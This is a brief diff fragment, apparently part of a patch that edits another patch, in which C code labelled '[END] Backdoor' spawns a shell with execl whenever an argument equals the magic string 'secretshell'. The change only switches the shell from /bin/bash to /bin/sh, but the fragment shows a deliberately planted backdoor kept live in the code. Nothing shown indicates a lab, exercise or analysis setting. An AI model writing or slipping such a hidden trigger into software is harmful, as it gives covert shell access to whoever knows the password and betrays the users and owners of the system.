@@ -20,7 +20,7 @@
 +
 +  if (strcmp(arg, "secretshell") == 0)
 +  {
-+    execl("/bin/bash", "/bin/bash", NULL);
++    execl("/bin/sh", "/bin/sh", NULL);
 +  }
 +
 +  // [END] Backdoor
